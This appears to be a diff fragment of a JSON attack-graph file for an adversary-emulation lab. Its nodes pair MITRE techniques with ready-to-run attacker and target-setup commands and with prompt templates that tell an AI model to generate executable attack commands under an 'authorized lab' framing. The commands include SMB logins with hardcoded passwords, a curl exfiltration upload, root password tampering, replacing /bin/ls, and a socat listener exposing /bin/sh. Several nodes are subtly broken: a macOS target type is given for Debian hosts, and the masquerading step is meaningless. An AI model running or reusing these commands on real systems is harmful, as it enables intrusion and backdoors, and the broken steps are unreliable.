vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors deceived victims into authorizing malicious connected apps to their organization's Salesforce portal.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.\nOAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks. \nLeveraging application integrations may allow adversaries to persist in an environment – for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account. In some cases, integrations may remain valid even after the original consenting user account is disabled. Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of Application Access Tokens. Finally, they may enable persistent Automated Exfiltration over time.\nCreating or adding a new application may require the adversary to create a dedicated Cloud Account for the application and assign it Additional Cloud Roles – for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "Remove added persistence mechanism",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:initial",
+        "capability:write_to_persistence_locations"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "895d1ea1-1841-476e-85af-5144bfef843b",
+      "node_index": 4,
+      "node_type": "structural",
+      "technique_id": "T1078.002",
+      "technique_name": "Domain Accounts",
+      "tactic": "defense-evasion",
+      "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used compromised credentials for lateral movement.",
+      "required_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "provides": [
+        "evasion_capability"
+      ],
+      "attacker_commands": [
+        "smbclient -L //172.21.0.20 -U labuser%LabPassword123! && smbclient //172.21.0.20/share -U labuser%LabPassword123! -c 'dir'"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y samba samba-common-bin && printf '[global]\\n   workgroup = LABDOMAIN\\n   server string = Host A Samba Server\\n   security = user\\n   map to guest = Bad User\\n[share]\\n   path = /srv/samba/share\\n   browsable = yes\\n   writable = yes\\n   guest ok = no\\n   valid users = labuser\\n' > /etc/samba/smb.conf && mkdir -p /srv/samba/share && useradd -m labuser && echo 'LabPassword123!' | passwd --stdin labuser 2>/dev/null || echo -e \"LabPassword123!\\nLabPassword123!\" | passwd labuser && (echo \"LabPassword123!\"; echo \"LabPassword123!\") | smbpasswd -s -a labuser && /usr/sbin/smbd && /usr/sbin/nmbd"
+      ],
+      "target_vuln_host_b": [
+        "useradd -m labuser && echo 'LabPassword123!' | passwd --stdin labuser 2>/dev/null || echo -e \"LabPassword123!\\nLabPassword123!\" | passwd labuser"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9"
+      ],
+      "child_nodes": [
+        "1dceef18-a7c0-43b4-85cb-68a27b452615"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1078.002 - Domain Accounts\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used compromised credentials for lateral movement.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications",
+        "Must evade default detection mechanisms"
+      ],
+      "cleanup_template": "Restore original configurations",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "1dceef18-a7c0-43b4-85cb-68a27b452615",
+      "node_index": 5,
+      "node_type": "structural",
+      "technique_id": "T1567",
+      "technique_name": "Exfiltration Over Web Service",
+      "tactic": "exfiltration",
+      "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors exfiltrated data via legitimate Salesforce API communication channels including the Salesforce Data Loader application.",
+      "required_prerequisites": [
+        "data:collected",
+        "need:c2_channel",
+        "c2:established"
+      ],
+      "provides": [
+        "exfiltrated_data"
+      ],
+      "attacker_commands": [
+        "curl -F \"file=@/root/sensitive_data.txt\" http://172.21.0.20:8080/upload"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip nginx && echo \"root:x:0:0:root:/root:/bin/bash\" >> /etc/passwd && echo \"root:RootPass123\" | chpasswd && mkdir -p /var/www/html/exfil && printf '<html><body><h1>Exfiltration Endpoint</h1></body></html>' > /var/www/html/exfil/index.html && python3 -m pip install --break-system-packages flask requests && printf 'from flask import Flask, request; app=Flask(__name__); @app.route(\"/upload\", methods=[\"POST\"]) def upload(): f=request.files[\"file\"]; f.save(\"/tmp/\"+f.filename); return \"OK\", 200; app.run(host=\"0.0.0.0\", port=8080)' > /root/exfil_server.py && python3 /root/exfil_server.py &"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Host A can establish outbound data transfer (from pre-prompt)",
+      "parent_nodes": [
+        "895d1ea1-1841-476e-85af-5144bfef843b"
+      ],
+      "child_nodes": [
+        "b416b8c7-56e3-4776-9c42-395c9ee54ac4"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1567 - Exfiltration Over Web Service\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors exfiltrated data via legitimate Salesforce API communication channels including the Salesforce Data Loader application.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "data:collected",
+        "need:c2_channel",
+        "c2:established"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "b416b8c7-56e3-4776-9c42-395c9ee54ac4",
+      "node_index": 6,
+      "node_type": "structural",
+      "technique_id": "T1036",
+      "technique_name": "Masquerading",
+      "tactic": "defense-evasion",
+      "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used voice calls to socially engineer victims into authorizing a modified version of the Salesforce Data Loader app.",
+      "required_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "provides": [
+        "evasion_capability"
+      ],
+      "attacker_commands": [
+        "curl http://172.21.0.20/bin/ls"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y wget procps && printf '#!/bin/bash\\necho \"Malicious script executed\"\\n' > /tmp/ls && chmod +x /tmp/ls && mv /bin/ls /bin/ls.bak && mv /tmp/ls /bin/ls"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "1dceef18-a7c0-43b4-85cb-68a27b452615"
+      ],
+      "child_nodes": [
+        "632d1194-f237-4866-9955-876afe5c66a9"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1036 - Masquerading\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used voice calls to socially engineer victims into authorizing a modified version of the Salesforce Data Loader app.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications",
+        "Must evade default detection mechanisms"
+      ],
+      "cleanup_template": "Restore original configurations",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "632d1194-f237-4866-9955-876afe5c66a9",
+      "node_index": 7,
+      "node_type": "structural",
+      "technique_id": "T1090",
+      "technique_name": "Proxy",
+      "tactic": "command-and-control",
+      "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used Mullvad VPN IPs to proxy voice phishing calls.",
+      "required_prerequisites": [
+        "access:initial",
+        "network:egress_allowed"
+      ],
+      "provides": [
+        "c2_channel",
+        "proxy_use"
+      ],
+      "attacker_commands": [
+        "socat TCP:172.21.0.20:8888 STDIN"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y socat && printf '#!/bin/sh\\nsocat TCP-LISTEN:8888,fork TCP:172.22.0.20:9999\\n' > /usr/local/bin/proxy.sh && chmod +x /usr/local/bin/proxy.sh && /usr/local/bin/proxy.sh &"
+      ],
+      "target_vuln_host_b": [
+        "apt-get update && apt-get install -y socat && printf '#!/bin/sh\\nsocat TCP-LISTEN:9999,fork EXEC:/bin/sh\\n' > /usr/local/bin/reverse_shell.sh && chmod +x /usr/local/bin/reverse_shell.sh && /usr/local/bin/reverse_shell.sh &"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Host A can initiate outbound connections (from pre-prompt)",
+      "parent_nodes": [
+        "b416b8c7-56e3-4776-9c42-395c9ee54ac4"
+      ],
+      "child_nodes": [
+        "ead35c74-f5b4-4815-84be-4ab46417f14e"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1090 - Proxy\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used Mullvad VPN IPs to proxy voice phishing calls.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:initial",
+        "network:egress_allowed"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "ead35c74-f5b4-4815-84be-4ab46417f14e",
+      "node_index": 8,
+      "node_type": "structural",
+      "technique_id": "T1585.002",
+      "technique_name": "Email Accounts",
+      "tactic": "resource-development",
+      "description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to Acquire Infrastructure for follow-on purposes.\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors registered emails shinycorp@tuta[.]com and shinygroup@tuta[.]com to send victims extortion demands.",
+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
